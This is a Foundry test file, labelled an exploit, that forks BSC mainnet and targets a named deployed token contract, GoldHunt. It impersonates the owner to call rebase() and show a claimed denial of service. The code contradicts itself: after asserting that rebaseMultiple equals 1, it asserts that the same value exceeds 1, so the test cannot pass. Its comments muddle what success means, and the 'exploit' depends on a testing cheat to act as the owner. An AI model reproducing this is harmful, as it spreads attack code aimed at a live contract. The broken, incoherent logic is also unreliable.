pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Interface for GoldHunt contract
interface GoldHunt {
    function owner() external view returns (address);
    function rebaseMultiple() external view returns (uint);
    function pair() external view returns (address);
    function rewardsPool() external view returns (address);
    function swapEnabled() external view returns (bool);
    function rebase(uint multiple) external;
    function setPair(address _pair) external;
    function setRewardsPool(address _rewardsPool) external;
    function setSwapEnable(bool _swapEnabled) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x6D3dd96f97b10fc86A7F8607704BBe9936083b89;
    address attacker = address(this);
    GoldHunt target;
    address owner;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Fork from BSC mainnet
        vm.createSelectFork(vm.rpcUrl("bsc"));

        // Initialize target
        target = GoldHunt(TARGET);

        // Label addresses for clarity
        vm.label(TARGET, "GoldHunt");
        vm.label(0x55d398326f99059fF775485246999027B3197955, "USDT");

        // Get the current owner of the contract
        owner = target.owner();
        vm.label(owner, "Owner");

        // Check current state
        uint currentRebaseMultiple = target.rebaseMultiple();
        address currentPair = target.pair();
        address currentRewardsPool = target.rewardsPool();
        bool currentSwapEnabled = target.swapEnabled();

        console.log("Current rebaseMultiple:", currentRebaseMultiple);
        console.log("Current pair:", currentPair);
        console.log("Current rewardsPool:", currentRewardsPool);
        console.log("Current swapEnabled:", currentSwapEnabled);

        // If pair is address(0), we can demonstrate the DOS
        if (currentPair == address(0)) {
            console.log("Pair is not set! rebase() will revert when calling sync() on address(0)");
        }

        // If rewardsPool is address(0), rebase will revert earlier
        if (currentRewardsPool == address(0)) {
            console.log("RewardsPool is not set! rebase() will revert at require statement");
        }
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Try to call rebase as owner (impersonate owner)
        vm.startPrank(owner);

        // Check if rebase would succeed
        uint initialRebaseMultiple = target.rebaseMultiple();
        console.log("Initial rebaseMultiple:", initialRebaseMultiple);

        // Try to call rebase with multiple = 2
        // This should fail if pair is address(0) or rewardsPool is address(0)
        try target.rebase(2) {
            // If this succeeds, check the new value
            uint newRebaseMultiple = target.rebaseMultiple();
            console.log("Rebase succeeded! New rebaseMultiple:", newRebaseMultiple);

            // The oracle expects rebaseMultiple > 1, so if it's now > 1, we failed
            // We need to show it stays at 1
            assertEq(newRebaseMultiple, 1, "rebaseMultiple should stay at 1 due to DOS");
        } catch Error(string memory reason) {
            console.log("Rebase failed with error:", reason);
            // Check that rebaseMultiple is still 1
            uint afterRebaseMultiple = target.rebaseMultiple();
            console.log("After failed rebase, rebaseMultiple:", afterRebaseMultiple);
            assertEq(afterRebaseMultiple, 1, "rebaseMultiple should still be 1");
        }

        vm.stopPrank();

        // Final check
        uint finalRebaseMultiple = target.rebaseMultiple();
        console.log("Final rebaseMultiple:", finalRebaseMultiple);

        // The oracle verification: assertGt(rebaseMultiple, 1)
        // But we want to show it's NOT > 1, so we assert it's == 1
        assertEq(finalRebaseMultiple, 1, "rebaseMultiple should be 1, demonstrating DOS");
        assertGt(GoldHunt(0x6D3dd96f97b10fc86A7F8607704BBe9936083b89).rebaseMultiple(), 1, "Logic Exploit Failed");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

